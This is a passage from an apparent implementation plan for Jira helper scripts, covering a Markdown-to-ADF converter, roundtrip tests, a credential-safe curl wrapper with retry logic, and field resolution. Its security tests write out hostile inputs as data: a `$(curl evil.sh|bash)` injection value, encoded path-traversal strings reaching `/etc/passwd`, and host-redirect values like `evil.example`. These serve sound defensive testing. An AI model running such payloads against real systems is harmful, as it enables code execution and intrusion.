HBR<RS>                         hard break (within previous P or list item)
CODE_OPEN<US><lang><RS>         fenced code block start (lang may be empty)
CODE_LINE<US><text><RS>         literal line inside a code block
                                (text MAY contain tabs, spaces, any
                                printable byte; bytes \x1e and \x1f
                                are rejected with E_ADF_BAD_INPUT)
CODE_CLOSE<RS>                  fenced code block end
ERR<US><E_CODE><US><message><RS>  pre-validation rejection
```

Both awk passes set `BEGIN { FS="\x1f"; RS="\x1e" }` to honour the
contract. The tokeniser pre-rejects any input containing literal
`\x1e` or `\x1f` bytes with `E_ADF_BAD_INPUT` (42) — these are
control characters that should not appear in user-authored Markdown.

The contract is documented in a header comment in
`jira-md-tokenise.awk` and reproduced in `jira-md-to-adf.sh`'s
header so both ends agree. A test fixture pair
(`tokenise-fixtures/<name>.md` → `tokenise-fixtures/<name>.records`)
exercises the tokeniser independently of the jq assembler so the
contract is testable end-to-end. Fixture
`code-block-with-tabs.{md,adf.json}` and a paragraph fixture
containing literal tabs exercise the tab-in-payload path; fixture
`reject-control-chars.md` exercises the `\x1e`/`\x1f`-rejection
path.

If `jira-md-to-adf.sh` itself grows beyond ~200 lines during
implementation, that is the trigger to split further (e.g. lift the
jq tree assembly into a separate `.jq` file invoked via `--from-file`).

Two-pass design per research §4.2:

- Pass 1 (awk block tokeniser): emits a record stream of
  `H{level}\t...`, `P\t...`, `BUL\t...`, `ORD\t...`,
  `TASK_TODO\t...`, `TASK_DONE\t...`,
  `CODE_OPEN\t<lang>`, `CODE_LINE\t...`, `CODE_CLOSE\t`.
- Pre-validation in awk: detect tables (`|...|...|`), nested lists
  (indentation under a list item), blockquotes (`^> `), and HTML; emit
  a list of detected unsupported features and exit 41 with
  `E_ADF_UNSUPPORTED_<TYPE>` on stderr.
- Pass 2 (jq with `--raw-input --slurp`): groups records into nodes,
  runs the inline tokeniser per text payload (greedy non-overlapping
  matches in order: code, link, bold, italic), wraps in
  `{"version":1,"type":"doc","content":[…]}`.
- `taskItem.attrs.localId` is generated by a portable
  `_jira_uuid_v4` function with the following dependency tier:
  1. `uuidgen` if on PATH (macOS, most Linux distros).
  2. Otherwise POSIX `od` + `awk` to format 16 random bytes from
     `/dev/urandom` as a real UUID v4 with version nibble forced to
     `4` and variant nibble forced to `8|9|a|b`:
     `od -An -N16 -tx1 /dev/urandom | tr -d ' \n' | awk '{ ... }'`
     where the awk program inserts hyphens at positions 8/12/16/20
     and substitutes the version/variant nibbles.
  3. If both fail (`/dev/urandom` unreadable in addition to
     missing `uuidgen`), exit non-zero with `E_MISSING_DEP: cannot
     generate UUID` rather than falling through with malformed
     output.

  The previous proposal — `head -c 16 /dev/urandom | xxd -p` — is
  rejected: `xxd` ships with `vim-common` and is absent on minimal
  Linux containers (Alpine, Debian-slim variants), and 32 hex chars
  with no hyphens or version/variant bits is not a valid UUID.
  Atlassian rejects malformed `localId` values on issue create.

- For test determinism, `_jira_uuid_v4` honours an unexported
  `JIRA_ADF_LOCALID_SEED` env var: when set, returns deterministic
  UUIDs derived from a counter (e.g. `00000000-0000-4000-8000-
  000000000001`, `...002`, ...) so compile fixtures can be byte-
  compared without the masking pass. The roundtrip test relies on
  the masking pass instead and does not set the seed.

Documented exit codes:

- 0: success
- 40: `E_BAD_JSON` (renderer)
- 41: `E_ADF_UNSUPPORTED_TABLE`, `E_ADF_UNSUPPORTED_NESTED_LIST`,
  `E_ADF_UNSUPPORTED_BLOCKQUOTE`, etc. (compiler)
- 42: `E_ADF_BAD_INPUT` (compiler — Markdown-shape unrecognised)

#### 6. test-jira-adf-roundtrip.sh (TDD: write last)

**File**: `skills/integrations/jira/scripts/test-jira-adf-roundtrip.sh`
**Changes**: new test script asserting **three** invariants per
fixture in the supported subset.

**Invariant 1 (Markdown round-trip)** — the load-bearing property:
`render(compile(md))` byte-equals `md` after a documented
canonicalisation step. This is what users actually rely on when
reading a Jira description, editing it locally, and writing it back.

```
jira-md-to-adf.sh < fixture.md | jira-adf-to-md.sh > out.md
canonicalise < fixture.md > expected.md
diff expected.md out.md
```

`canonicalise` is a deterministic pre-pass with the following
ordered algorithm:

1. **Line endings**: replace every `\r\n` with `\n`.
2. **Trailing whitespace**: for each line, if it ends with two or
   more spaces followed by `\n` (hard-break marker), preserve
   exactly two trailing spaces; otherwise strip all trailing
   spaces and tabs. Always preserve the terminating `\n`.
3. **Mark canonicalisation**. The supported subset is **tightened
   to asterisk-form only** for emphasis: `**bold**` and `*italic*`
   are the only accepted forms. Underscore-form delimiters (`__`
   and lone `_`) are treated as **literal text** in paragraphs and
   list items, not as emphasis markers. This eliminates the
   interleaved-delimiter ambiguity (e.g. `_a __b_ c__`,
   `snake_case_variable`) that any stack-based or flanking
   heuristic must otherwise resolve, and matches how identifiers
   appear naturally in technical writing (`some_var`, `__init__`,
   `epic_link`).

   Rationale: the previous "top-of-stack-only" delimiter-stack
   rule was under-specified for inputs like `_a __b_ c__` and
   would have required either a CommonMark left/right-flanking
   heuristic or restricting the supported subset. The latter is
   simpler, more predictable for the user (no surprise emphasis
   on `snake_case`), and well-aligned with how Jira itself
   renders descriptions (the most common emphasis form in
   Atlassian content is asterisk-based).

   Implementation: canonicalisation does not need a parser at
   all — the asterisk-only subset means the renderer always
   emits `**`/`*` and the compiler only recognises `**`/`*`.
   Canonicalisation reduces to a no-op verification pass that
   asserts no underscore-form emphasis would have been parsed
   under the old rules (a `grep` for `(^|[^_])__[^_]+__([^_]|$)`
   in input is a soft-warning trigger pointing the user at the
   restriction; not an error).

   Within a code span (between matching `` ` `` markers) and
   inside fenced code blocks, underscores are opaque content
   regardless.

Fixtures asserting the canonicalisation rules:

- `bold-italic-asterisk.md` (replaces `bold-italic-aliases.md`)
  — `**bold**` and `*italic*` round-trip cleanly.
- `underscores-as-literals.md` — paragraphs containing
  `snake_case_variable`, `__init__`, `epic_link`,
  `_leading_and_trailing_`. Asserts the rendered ADF preserves
  every underscore as literal `text` content (no `em`/`strong`
  marks emitted) and that Invariant 1 holds.
- `mixed-asterisk-emphasis.md` — `**bold with *italic* inside**`
  and `*italic with **bold** inside*`. Asserts both invariants
  hold; documents the supported nesting form.
- `underscore-warning.md` — paragraph containing
  `__looks_like_old_bold__`. Asserts compile succeeds (literal
  underscores in output) AND a one-line stderr warning fires:
  `Notice: '__...__' is not emphasis in this subset; use
  **...** for bold`. The warning is informational, not
  error-level — the document still compiles successfully.

Each fixture's `<name>.md` is already in canonical form so the diff
against `render(compile(md))` is empty for the supported subset.

**Invariant 2 (ADF fixed-point)** — catches renderer/compiler drift:

```
jira-md-to-adf.sh < fixture.md \
  | jira-adf-to-md.sh \
  | jira-md-to-adf.sh \
  | jq -S . > out2.adf.json
jira-md-to-adf.sh < fixture.md | jq -S . > out1.adf.json
diff out1.adf.json out2.adf.json
```

Asserts the second compile equals the first. Uses `jq -S` to
normalise key order. Before diffing, both files are post-processed
with `jq 'walk(if type == "object" and has("localId") then .localId
= "<masked>" else . end)'` so non-deterministic `taskItem.localId`
values do not cause spurious failures.

**Invariant 3 (no silent drop)** — guards against compiler bugs
that silently erase content while preserving overall length. A
character-length floor is too coarse: a bug that drops every URL
while preserving link text would still pass a 90% length check.
Instead, assert structural preservation by counting *distinguished
marker tokens* embedded in each fixture and verifying counts match
in input and rendered output:

- Each fixture's `<name>.md` includes at least one of each
  supported node type seeded with a unique 8-character marker
  (`URL_M00001`, `CODE_M00002`, `BOLD_M00003`, ...) appearing once
  in the fixture body. The plan adds 12 such markers across the
  fixture corpus.
- The test runs `grep -c '<MARKER>' fixture.md` and
  `grep -c '<MARKER>' rendered.md` and asserts equality for every
  marker. A renderer that drops URLs but keeps link text would
  fail because `URL_M00001` appears in the URL portion of
  `[text](https://example.com/URL_M00001)` and would not survive a
  url-erasing render.
- For attribute-bearing nodes (links, code blocks with language,
  task items), the marker is placed in the load-bearing attribute
  (URL, language tag, completion state) so that attribute-erasing
  bugs trip the assertion.

A length-comparison floor is retained as a cheap secondary check
(rendered output ≥ 90% of canonical input length) but is no longer
the primary defence — it catches catastrophic erasure that the
marker scheme might miss only if the bug also erases markers.

### Success Criteria

#### Automated Verification

- [x] `bash skills/integrations/jira/scripts/test-jira-adf-to-md.sh`
  passes (all rendering fixtures + placeholder cases).
- [x] `bash skills/integrations/jira/scripts/test-jira-md-to-adf.sh`
  passes (all compile fixtures + rejection cases + placeholder
  collision case).
- [x] `bash skills/integrations/jira/scripts/test-jira-adf-roundtrip.sh`
  passes (every fixture is a round-trip fixed point).
- [x] `mise run test` passes.

#### Manual Verification

- [ ] Hand-author a paragraph with `**bold**`, `*italic*`, `[a](b)`,
  `` `code` `` and one bullet list. Run through the compiler, paste
  the resulting JSON into Jira's API explorer "Create issue" body and
  confirm Jira renders it correctly.
- [ ] Render a real Jira issue's `description` ADF (fetched manually
  via `curl`) through `jira-adf-to-md.sh` and confirm the Markdown
  reads as expected.

---

## Phase 5: jira-request.sh

### Overview

Land the curl wrapper that signs every Jira API request, retries on
429 with `Retry-After`-respecting exponential backoff, maps
non-2xx status codes to documented exit codes, and surfaces the
response body on stderr for caller diagnostics. Tests use a small
Python `http.server` mock fixture rather than live calls. Python is
already a pinned dev dependency (`mise.toml`); the mock server is
test infrastructure only — the runtime helper is pure bash/curl/jq.

### Changes Required

#### 1. Mock Jira server (test infrastructure, not a fixture)

**File**: `skills/integrations/jira/scripts/test-helpers/mock-jira-server.py`
**Changes**: new Python script (~80–120 lines). Located under a new
`test-helpers/` sibling to `test-fixtures/` rather than inside it —
`test-fixtures/` holds inert data files (golden text, JSON samples,
scenario JSON) and the established convention is that no executable
code lives there. `test-helpers/` is the home for test
infrastructure (mock servers, fixture-loader scripts).

The file pins a minimum Python version with an explicit guard so
contributors running tests outside a `mise` activation get a clear
error rather than a cryptic stdlib import failure:

```python
#!/usr/bin/env python3
import sys
if sys.version_info < (3, 9):
    sys.exit(
        "mock-jira-server.py requires Python 3.9+; "
        f"got {sys.version.split()[0]}"
    )
```

Test wiring invokes the script with `python3` (never bare `python`,
which on some Linux distros still resolves to Python 2). When `mise`
is detected on PATH, the test script prefers `mise exec -- python3`
to honour the project's pinned Python. A `BaseHTTPRequestHandler`
subclass driven by a JSON "scenario" file passed via `--scenario <path>`.
Each scenario defines an ordered list of expected requests with shape:

```json
{
  "expectations": [
    {
      "method": "GET",
      "path": "/rest/api/3/myself",
      "auth": "Basic dG9ieUBnby1hdG9taWMuaW86dG9rZW4=",
      "response": {"status": 200, "headers": {}, "body": "{...}"}
    },
    {
      "method": "POST",
      "path": "/rest/api/3/search/jql",
      "response": {"status": 429, "headers": {"Retry-After": "1"}, "body": "{...}"},
      "consume": false
    },
    {
      "method": "POST",
      "path": "/rest/api/3/search/jql",
      "response": {"status": 200, "body": "{...}"}
    }
  ]
}
```

`consume: false` means the expectation is matched but not consumed —
useful for retry tests where the same request is expected twice.

The fixture binds `127.0.0.1:0` (random port), writes the chosen URL
to a file passed via `--url-file`, and exits when it receives
`SIGTERM` or after the last expectation is consumed (whichever first).

**Response-body fidelity**: the response bodies referenced by each
expectation are loaded from `test-fixtures/api-responses/<endpoint>.json`
files captured from a real Jira tenant — not synthesised by hand. A
contributor with live credentials runs a one-time recorder
(`scripts/record-jira-cassettes.sh`, added to this phase) that
calls the relevant endpoints (`/rest/api/3/myself`,
`/rest/api/3/field`, `/rest/api/3/project`, `/rest/api/3/search/jql`)
against their tenant, redacts personal data via `jq` (replaces
`accountId`, email, `displayName`, etc. with stable placeholders),
and writes the resulting bodies to `test-fixtures/api-responses/`.
The cassettes are committed and used by the mock so the tests
exercise byte-for-byte realistic Jira response shapes.

A fidelity test (`test-jira-mock-fidelity.sh`) asserts that for each
status code the helper handles (200, 401, 403, 404, 410, 429, 500),
the captured response shape matches the mock's playback.

**Retry-After format coverage**: the mock supports both
delta-seconds (`Retry-After: 1`) and HTTP-date
(`Retry-After: Wed, 30 Apr 2026 12:00:05 GMT`) forms. Test cases 8
and 9 exercise each form.

**Lifecycle hardening**:

- The test helper waits up to 5 s for the URL file to materialise
  (`while [ ! -s "$URL_FILE" ]; do sleep 0.1; done` with a counter);
  on timeout, exits non-zero with a clear error rather than
  blocking indefinitely.
- A trap on `EXIT` `kill`s the mock PID; the umbrella
  `test-jira-scripts.sh` runs a final `pgrep -f mock-jira-server.py`
  sweep and fails loudly if any orphans remain.
- The script asserts `python3` is on PATH at start; on absence,
  emits a clear error pointing at the `mise` Python pin and exits
  non-zero (rather than failing in the middle of a test).

#### 2. test-jira-request.sh helper

**File**: `skills/integrations/jira/scripts/test-jira-request.sh`
**Changes**: new test script with helpers `start_mock(scenario_path)`
and `stop_mock()` that background the Python server, wait for the
URL file to materialise, and `kill` on cleanup via `trap … EXIT`.

The test script overrides the resolved base URL to point at the mock.
Implementation: `jira-request.sh` accepts a
`ACCELERATOR_JIRA_BASE_URL_OVERRIDE_TEST` env var that, when set,
replaces the base URL used for the request — but **only** when
`ACCELERATOR_TEST_MODE=1` is also set in the same environment, and
**only** when the override resolves to `127.0.0.1`, `localhost`, or
a hostname matching `^127\.0\.0\.1:[0-9]+$` /
`^localhost:[0-9]+$`. Either gate failing causes the helper to
refuse the override and emit
`E_TEST_OVERRIDE_REJECTED: ACCELERATOR_JIRA_BASE_URL_OVERRIDE_TEST
ignored — production code path` to stderr. The double sentinel
(separate `_TEST` suffix on the URL var plus the
`ACCELERATOR_TEST_MODE` boolean) means a malicious dotfile, direnv
script, or compromised dependency cannot single-handedly redirect
authenticated requests to an arbitrary host.

Add a regression test asserting that
`ACCELERATOR_JIRA_BASE_URL_OVERRIDE_TEST=https://evil.example`
without `ACCELERATOR_TEST_MODE=1` is rejected, and that
`ACCELERATOR_TEST_MODE=1
ACCELERATOR_JIRA_BASE_URL_OVERRIDE_TEST=https://evil.example` (a
non-loopback URL even with the gate) is also rejected.

Cases:

1. GET 200 — exit 0, body on stdout.
2. POST 200 with JSON body — exit 0, body on stdout, body sent
   correctly per the mock's recorded request.
3. POST multipart with file part — exit 0; mock asserts the
   `X-Atlassian-Token: no-check` header is present.
4. 401 — exit 11; response body on stderr.
5. 403 — exit 12.
6. 404 — exit 13.
7. 410 — exit 14.
8. 429 with `Retry-After: 1` (delta-seconds) followed by 200 — exit 0
   after one retry; the test substitutes `JIRA_RETRY_SLEEP_FN` with a
   counter and asserts (a) exactly one sleep was scheduled, (b) the
   scheduled sleep was 1 s, (c) no jitter was applied
   (`Retry-After` overrides jitter).
9. 429 with `Retry-After: <HTTP-date 2 s in the future>` followed
   by 200 — exit 0 after one retry; asserts the date-form parser
   computes a sleep ≤ 60 s (cap) and that no jitter was applied.
9a. 429 with `Retry-After: <HTTP-date 30 s in the past>` followed
    by 200 — exit 0 after one retry; the substituted sleep
    counter records exactly one sleep of `1` (the floor from
    `max(1, min(parsed, 60))`); no jitter; no stderr warning
    (the date parsed cleanly even though it was in the past).
9b. 429 with `Retry-After: not-a-date` followed by 200 — exit 0
    after one retry; the substituted sleep counter records one
    sleep consistent with the jittered exponential branch (NOT
    1 s); stderr contains the literal warning
    `Warning: malformed Retry-After header; falling back to
    exponential backoff`.
9c. 429 with `Retry-After: <RFC-850 form, 2 s in future>`
    followed by 200 — exit 0 after one retry; sleep is the
    parsed delta (within the 1-60 s clamp); RFC-850 form is
    accepted by the parser.
9d. 429 with `Retry-After: <HTTP-date with no timezone>` —
    follows the falls-back-to-jittered-backoff branch (tz-naive
    is treated as parser failure) with the malformed-warning
    stderr.
10. 429 four times in a row with no `Retry-After` — exit 19 after
    exhausting retries; the counter records 3 sleeps; assert each
    sleep is `min(2^attempt, 60)` ± 30% (computed from the captured
    sleep values, not from wall time).
11. 5xx — exit 20.
12. Network refused (mock not started) — exit 21 (`E_REQ_CONNECT`).
13. **Token absent from process listing**: while a curl request is
    in flight against a slow mock endpoint (mock sleeps 500 ms
    before responding), the test reads
    `ps -o args= -p <curl-pid>` and `/proc/<curl-pid>/cmdline`
    (where available) and asserts the sentinel token value
    (`tok-SENTINEL-xyz123`) is absent from both.
14. **Token absent from --debug stderr**: with sentinel token, the
    test runs `--debug` and asserts the sentinel does not appear in
    stderr; also asserts that stderr does not contain
    `Authorization:` (case-insensitive) or the
    `base64(email:tok-SENTINEL-xyz123)` substring.
15. **--debug does not enable curl verbose**: with sentinel token,
    test asserts that no `-v`/`--verbose`/`--trace*` argument is
    forwarded to curl by inspecting the dry-run command-string
    output and confirming absence of those flags.
16. Token resolution failure (no creds) — exits 22
    (`E_REQ_NO_CREDS`).
17. **Test override gate rejects production-mode use**: with
    `ACCELERATOR_JIRA_BASE_URL_OVERRIDE_TEST=https://evil.example`
    set but `ACCELERATOR_TEST_MODE` unset, the helper exits non-zero
    with `E_TEST_OVERRIDE_REJECTED` on stderr and never connects.
18. **Test override rejects non-loopback URLs even with
    ACCELERATOR_TEST_MODE=1**: with both env vars set but the
    override pointing at `https://evil.example`, the helper exits
    non-zero with `E_TEST_OVERRIDE_REJECTED`.
19. **Path argument validation**: each of the following exits
    non-zero with `E_REQ_BAD_PATH` on stderr, and the stderr
    message names the specific rule that fired (e.g.
    `E_REQ_BAD_PATH: '/rest/api/3//search' rejected — consecutive
    slashes`):
    `jira-request.sh GET 'https://evil.example/x'` (absolute URL —
    rule: not under `/rest/api/3/`);
    `jira-request.sh GET '/../../etc/passwd'` (literal traversal —
    rule: path traversal sequence);
    `jira-request.sh GET '/rest/api/3/issue/../../field'`
    (embedded traversal — rule: path traversal sequence);
    `jira-request.sh GET '/rest/api/3/%2e%2e%2fadmin'`
    (single-encoded traversal — rule: path traversal sequence after
    URL-decoding);
    `jira-request.sh GET '/rest/api/3/%252e%252e%252fadmin'`
    (double-encoded traversal — rule: path traversal sequence after
    iterative URL-decoding);
    `jira-request.sh GET '/rest/api/3//search'`
    (rule: consecutive slashes);
    `jira-request.sh GET $'\\rest\\api\\3\\issue\\\\x07'`
    (rule: control character at byte 0x07);
    a 9-deep nested-encoded path (rule: URL-decode iteration cap
    exceeded).
    Plus a positive case: `jira-request.sh GET '/rest/api/3/search?jql=project%20%3D%20ENG'`
    is **accepted** (legitimate query string with percent-encoded
    space and `=`), guarding against over-rejection.
20. **Empty 200 body**: a 200 response with `Content-Length: 0`
    exits 0 with empty stdout (no panic, no parse error).
21. **Non-JSON 200 body**: a 200 response containing an HTML error
    page (the classic transparent-proxy outage signature) exits
    `E_REQ_BAD_RESPONSE` (16) with the body on stderr; helper does
    not assume JSON shape downstream.
22. **Multi-MB JSON body**: a 5 MB scenario response (matching the
    Performance Considerations note about large `/rest/api/3/field`
    payloads) round-trips through stdout without truncation;
    asserted via byte-length comparison.
23. **Unicode body**: a 200 response with non-ASCII content
    (`displayName` containing CJK + emoji + combining diacritics)
    is preserved verbatim on stdout (no transcoding, no normalisation).
24. **JIRA_RETRY_SLEEP_FN gated by ACCELERATOR_TEST_MODE**: with
    `JIRA_RETRY_SLEEP_FN=test_record_sleep` set but
    `ACCELERATOR_TEST_MODE` unset, a 429 retry scenario uses real
    `sleep` (not the substituted function); helper emits
    `E_TEST_HOOK_REJECTED` to stderr; the no-op counter is not
    invoked.
25. **JIRA_RETRY_SLEEP_FN allow-list**: with
    `ACCELERATOR_TEST_MODE=1` and
    `JIRA_RETRY_SLEEP_FN=evil_fn` (name does not match
    `^_?test_[a-z_]+$`), helper emits `E_TEST_HOOK_REJECTED` and
    uses real `sleep`.
26. **Site validation**: with `JIRA_SITE=evil.com#`, every method
    exits non-zero with `E_BAD_SITE` before any network call.

#### 3. jira-request.sh

**File**: `skills/integrations/jira/scripts/jira-request.sh`
**Changes**: new executable. Sources `jira-common.sh` and
`jira-auth.sh`. Usage:

```
jira-request.sh GET <path> [--query KEY=VAL]...
jira-request.sh POST <path> --json @file | --json '<inline>'
jira-request.sh POST <path> --multipart 'file=@./path' [--multipart 'file=@...']
jira-request.sh PUT <path> --json @file
jira-request.sh DELETE <path>
```

**Input validation** (runs before any network call):

- `JIRA_SITE` must match `^[a-z0-9][a-z0-9-]{0,61}[a-z0-9]$` (DNS
  label rules, lowercase only). Failure: exit `E_BAD_SITE` (15) with
  `E_BAD_SITE: jira.site '<value>' is not a valid Cloud subdomain`
  on stderr. Without this guard a malicious PR setting
  `site: evil.com#@victim` could redirect authenticated requests off
  Atlassian.
- `<path>` must satisfy **all** of the following checks; failure of
  any check exits `E_REQ_BAD_PATH` (17):
  1. Matches the character-set regex
     `^/rest/api/3/[A-Za-z0-9._/?=&,:%@-]+$` (allows the
     `?KEY=VAL&...` query composed by `--query` flags).
  2. Does **not** contain a `..` path segment — rejects values
     matching `(^|/)\.\.(/|$)` after URL-decoding **iteratively to
     a fixed point** (decode repeatedly until output is unchanged,
     capped at 8 iterations to bound pathological inputs;
     iteration cap exceeded exits `E_REQ_BAD_PATH`). This catches
     literal `/../`, single-encoded `%2e%2e%2f`, and double-encoded
     `%252e%252e%252f` — the latter would otherwise survive a
     single decode (becoming `%2e%2e%2f`, no literal `..`) and be
     completed by an upstream proxy server-side.
  3. Does **not** contain consecutive slashes (`//`) outside the
     scheme position — `/rest/api/3//search` is rejected.
  4. Does **not** contain control characters (bytes `\x00`–`\x1f`,
     `\x7f`) even after iterative URL-decoding.

  Validation runs on the *literal* argument before any base URL
  concatenation, then again on each iterative URL-decoded form so
  encoded (single or multiply nested) traversal sequences cannot
  smuggle through. Test cases (Phase 5 §2 case 19 expanded) cover
  literal `/../../etc/passwd`, single-encoded `%2e%2e%2f`,
  double-encoded `%252e%252e%252f`, and a pathological 9-deep
  nesting that should trip the iteration cap.

**Documented exit codes** (added to header comment, also documented
in `EXIT_CODES.md` — see Implementation Approach):

- 0: success
- 11: 401 Unauthorized
- 12: 403 Forbidden
- 13: 404 Not Found (also returned by Jira for permission-denied on
  some endpoints — callers must not assume "truly absent")
- 14: 410 Gone
- 15: `E_BAD_SITE` (jira.site failed validation)
- 16: `E_REQ_BAD_RESPONSE` (response shape unexpected — non-JSON
  body on 200, HTML error page from a transparent proxy)
- 17: `E_REQ_BAD_PATH` (path argument failed validation)
- 18: `E_TEST_OVERRIDE_REJECTED`
  (`ACCELERATOR_JIRA_BASE_URL_OVERRIDE_TEST` refused — see test
  seam description above)
- 19: 429 retries exhausted
- 20: 5xx
- 21: connection error / DNS / timeout
- 22: no resolvable credentials
- 23: `E_TEST_HOOK_REJECTED` (`JIRA_RETRY_SLEEP_FN` or
  `JIRA_ADF_LOCALID_SEED` set without `ACCELERATOR_TEST_MODE=1`,
  or function name fails the allow-list / `declare -F` check)

Retry policy specification:

- Maximum 4 attempts (1 initial + 3 retries).
- When the response carries a `Retry-After` header (delta-seconds
  *or* HTTP-date format), sleep
  `max(1, min(parsed_seconds, 60))` with **no jitter** before the
  next attempt — the server's instruction is authoritative, but
  the sleep is clamped to a sensible range so clock skew (server
  ahead of client) cannot produce negative sleeps and an
  expired/just-past date cannot produce a zero-sleep tight retry
  loop. A 1 s floor preserves the spirit of "back off" even when
  the server's date has already passed.
- When `Retry-After` is absent on a 429 or 5xx, sleep
  `min(base * 2^attempt, 60) * (1 ± rand(0..0.30))` with `base=1s`,
  applying ±30% jitter; the seed is derived from `$RANDOM` (bash
  built-in, always available) XORed with `$(date +%s)` to avoid
  identical seeds across rapid restarts.
- HTTP-date `Retry-After` parsing uses a pure-bash `_jira_parse_http_date`
  function that tries GNU `date -d "$datestr"` first (Linux), then
  BSD `date -j -f "%a, %d %b %Y %H:%M:%S %Z" "$datestr"` (macOS)
  and the RFC-850 form `date -j -f "%A, %d-%b-%y %H:%M:%S %Z"`.
  Both invocations run under `LC_ALL=C` so month-name parsing is
  locale-independent. On any failure (unrecognised format, tz-less
  string, unsupported form), the function returns non-zero and the
  caller falls through to the absent-header branch (exponential +
  jitter) with a single-line stderr warning
  `Warning: malformed Retry-After header; falling back to
  exponential backoff`. The resulting epoch value is compared
  against `$(date +%s)` to compute `delta_seconds`, clamped to
  `[1, 60]`. Test cases (Phase 5 §2 cases 9, 9a, 9b, 9c, 9d)
  cover: future date (clamps to ≤60 s), past date (clamps to 1 s
  floor), malformed string (warning + jittered backoff), RFC-850
  form (accepted), unrecognised form (falls back).
- For test determinism, the helper honours
  `JIRA_RETRY_SLEEP_FN` — but **only when `ACCELERATOR_TEST_MODE=1`
  is also set** (matching the gating policy on
  `ACCELERATOR_JIRA_BASE_URL_OVERRIDE_TEST`). Without the test-mode
  gate, the variable is ignored and the helper uses real `sleep`,
  closing what would otherwise be a code-injection sink (a
  malicious dotfile or compromised dependency setting
  `JIRA_RETRY_SLEEP_FN=$(curl evil.sh|bash)` would otherwise run
  arbitrary code under the same shell that holds the resolved
  `JIRA_TOKEN`).
- The substituted function name must additionally match
  `^_?test_[a-z_]+$` and be defined in the caller's scope (verified
  via `declare -F`). On either check failing, the helper emits
  `E_TEST_HOOK_REJECTED: JIRA_RETRY_SLEEP_FN ignored — name
  '<name>' is not an allowed test hook` to stderr and uses real
  `sleep`.
- Tests substitute a no-op + counter implementation (named e.g.
  `test_record_sleep`) to assert *number* of retries and *sequence*
  of planned sleeps without wall-clock waits. Phase 5 §2 adds a
  regression test asserting that
  `JIRA_RETRY_SLEEP_FN=evil_fn` (without `ACCELERATOR_TEST_MODE=1`)
  is ignored — the helper uses real `sleep` and emits
  `E_TEST_HOOK_REJECTED`.
- The same gating policy applies to `JIRA_ADF_LOCALID_SEED` (Phase
  4 §5): only honoured when `ACCELERATOR_TEST_MODE=1`. Without the
  gate, the env var is ignored and the helper uses the normal
  fallback chain.

The plan drops wall-clock timing assertions in favour of
retry-count/sleep-sequence assertions. The previous "case 8 elapsed
time between 1.0 s and 3.0 s" success criterion is removed.

Implementation reads curl's `--write-out '%{http_code}'` into a
status variable and the body into a tempfile.

**Credential passing**: the actual `curl` invocation **must not**
use `-u email:token` because that places `email:token` in argv,
visible to any local user via `ps`/`/proc/<pid>/cmdline`. Instead,
credentials are passed to curl via `--config -` reading from a
heredoc on stdin:

```bash
printf 'user = "%s:%s"\n' "$JIRA_EMAIL" "$JIRA_TOKEN" \
  | curl --config - <other-flags> "$URL"
```

This keeps the token out of the process table for the duration of
every request. The redaction test (Phase 5 §2 case 12) asserts the
token does not appear in `ps -o args= -p <curl-pid>` output for an
in-flight curl invocation.

**`--debug` flag** prints the resolved equivalent curl command line
to stderr with the token replaced by `***`. The flag MUST NOT enable
curl `-v`/`--verbose`/`--trace`/`--trace-ascii`/`--trace-time`
(verbose modes print the full Authorization header, which contains
the base64-encoded `email:token`). This prohibition is documented in
the helper header comment; Phase 5 §2 case 14 asserts that
`--debug` output does not contain `Authorization:` (case-insensitive)
or any base64-decoded substring of the token.

### Success Criteria

#### Automated Verification

- [x] `bash skills/integrations/jira/scripts/test-jira-request.sh`
  passes (twenty-four cases including the path-traversal,
  test-override, malformed-response, and test-hook-gating
  regressions).
- [x] `mise run test` passes.
- [x] Backoff sequence test: case 10 asserts the captured sleep
  sequence (3 sleeps, each `min(2^attempt, 60) ± 30%` from the
  recorded values) — no wall-clock dependence.

#### Manual Verification

- [ ] Configure live credentials in `accelerator.local.md`. Run
  `bash skills/integrations/jira/scripts/jira-request.sh GET /rest/api/3/myself`
  and confirm a JSON body with `accountId`, `displayName`,
  `emailAddress`, `timeZone` is printed.
- [ ] Run with an intentionally-wrong token; confirm exit code 11 and
  the API's error body on stderr.

---

## Phase 6: jira-fields.sh

### Overview

Custom-field discovery, slug generation, and name-to-ID resolution
from a persisted cache. Exercises `jira-request.sh` end-to-end against
the mock fixture.

### Changes Required

#### 1. test-jira-fields.sh (TDD: write first)

**File**: `skills/integrations/jira/scripts/test-jira-fields.sh`
**Changes**: new test script. Cases:

1. `jira_field_slugify "Story Points"` → `story-points`.
2. `jira_field_slugify "Epic Link"` → `epic-link`.
3. `jira_field_slugify "Customer Champion?"` → `customer-champion`
   (non-alphanumeric collapses to single dash; trailing dash stripped).
4. `jira_field_slugify "  Spaces  "` → `spaces` (leading/trailing
   whitespace stripped before slug derivation).
5. `jira-fields.sh refresh` against a mock that returns a known
   `/rest/api/3/field` payload writes
   `meta/integrations/jira/fields.json` with the expected
   `{site, fields: [...]}` shape via `atomic_write`. The persisted
   file contains **no timestamp**: `lastUpdated` is tracked
   out-of-band in a sibling gitignored file
   `meta/integrations/jira/.refresh-meta.json` so the committed
   cache stays byte-idempotent — running `refresh` against an
   unchanged tenant produces a no-op diff. Test asserts that two
   consecutive `refresh` calls (against the same mock scenario)
   leave `fields.json` byte-identical.
6. `jira-fields.sh resolve story-points` against a populated cache
   prints `customfield_10016` and exits 0.
7. `jira-fields.sh resolve customfield_10016` (passing the ID
   directly) prints it back unchanged.
8. `jira-fields.sh resolve nonexistent` exits with `E_FIELD_NOT_FOUND`
   on stderr (exit 50).
9. `jira-fields.sh resolve "Story Points"` (passing the friendly name
   verbatim, not the slug) also resolves to the customfield ID. The
   resolver matches against `name`, `slug`, `id`, and `key` in that
   order.
10. `jira-fields.sh list` prints the cached catalogue as JSON
    (the file's `.fields` array, not the wrapper object).
11. `jira-fields.sh resolve` against an absent cache exits with
    `E_FIELD_CACHE_MISSING` (exit 51) and an error message pointing
    to `init-jira` or `jira-fields.sh refresh`.
12. **Byte-idempotent refresh**: two consecutive `refresh` calls
    against the same mock scenario leave `fields.json` byte-
    identical (no `lastUpdated` churn). `.refresh-meta.json` may
    differ between calls — the test inspects only `fields.json`.
13. **Concurrent refresh serialisation**: two `refresh` invocations
    backgrounded against the same mock complete cleanly; the
    losing process exits with `E_REFRESH_LOCKED` (53), the winning
    process writes `fields.json` once. The mock is configured to
    sleep 200 ms before responding so the lock contention is
    deterministic.

#### 2. jira-fields.sh

**File**: `skills/integrations/jira/scripts/jira-fields.sh`
**Changes**: new executable + sourceable. Subcommands:
`refresh`, `resolve <name-or-id>`, `list`. Implements the thirteen
